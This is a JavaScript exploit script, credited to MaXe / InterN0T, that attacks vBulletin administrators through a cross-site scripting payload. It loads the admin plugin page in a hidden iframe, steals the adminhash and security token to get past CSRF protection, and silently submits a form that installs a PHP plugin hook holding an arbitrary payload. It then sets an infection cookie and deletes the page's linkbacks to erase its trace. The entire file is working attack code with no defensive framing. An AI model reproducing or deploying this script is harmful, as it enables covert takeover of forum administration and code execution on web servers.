// Author: MaXe / InterN0T

function silent_inject() {

   // Read and save the adminhash + securitytoken - Bypass the CSRF protection
   var adminhash = top.document.getElementById('silent_frame').contentDocument.cpform.adminhash.value;
   var securitytoken = top.document.getElementById('silent_frame').contentDocument.cpform.securitytoken.value;

   // A hidden vBulletin plugin payload
   var form_input = '\
   <input type="hidden" name="do" value="update" />\
   <input type="hidden" name="adminhash" value="'+adminhash+'" />\
   <input type="hidden" name="securitytoken" value="'+securitytoken+'" />\
   <input type="hidden" name="product" value="vbulletin" />\
   <input type="hidden" name="hookname" value="misc_start" />\
   <input type="hidden" name="title" value="injected_haxx" />\
   <input type="hidden" name="executionorder" value="5" />\
   <input type="hidden" name="phpcode" value=\'PHP_PAYLOAD\' />\
   <input type="hidden" name="active" value="1" />\
   <input type="hidden" name="pluginid" value="" />\
   ';

   // A function which silently injects our hidden payload form
   function silent_form_inject(action,method,content) {
      var silent_main_tag = document.createElement('form');

      // The inner contents of our form is equal to the content variable
      silent_main_tag.innerHTML = ' '+content;
      top.document.getElementById('silent_frame').contentDocument.body.appendChild(silent_main_tag);
      silent_main_tag.setAttribute('id','soslabs');
      silent_main_tag.setAttribute('name','soslabs');
      silent_main_tag.setAttribute('action',action);
      silent_main_tag.setAttribute('method',method);
      }

   // Initiate the second silent injection into our iframe
   silent_form_inject('plugin.php?do=update','POST',form_input);

   // Send our payload automatically - There's no turning back now
   if (document.cookie.indexOf("XSS_Infected") == -1) {
      top.document.getElementById('silent_frame').contentDocument.getElementById('soslabs').submit();
      SetCookie("XSS_Infected","true"); // Prevent re-infection / loops
   }

   // Give the malicious linkback 2 secs to inject a small payload, before self-removal
   var end = setTimeout("clean_up()",2000); 

}

// Delete all LinkBacks on the current page - Including ours
function clean_up() {
   js_check_all_option(document.linkbacks, -1);
   document.linkbacks.submit();
}

// A function to create a cookie so the infection happens only once
function SetCookie(cookieName,cookieContent) {
   var cookiePath = '/';
   var expDate=new Date();
   expDate.setTime(expDate.getTime()+372800000);
   var expires=expDate.toGMTString();
   document.cookie=cookieName+"="+escape(cookieContent)+";path="+escape(cookiePath)+";expires="+expires;
}


// If our cookie is not present, continue
if (document.cookie.indexOf("XSS_Infected") == -1) {

   // Append a (hidden) iframe for stealthy data injection
   var mainframe = document.createElement("iframe");
   mainframe.setAttribute('id', 'silent_frame');
   top.document.body.appendChild(mainframe);
   mainframe.setAttribute('onload', 'main.silent_inject()');
   mainframe.setAttribute('src', 'plugin.php?do=add');
}

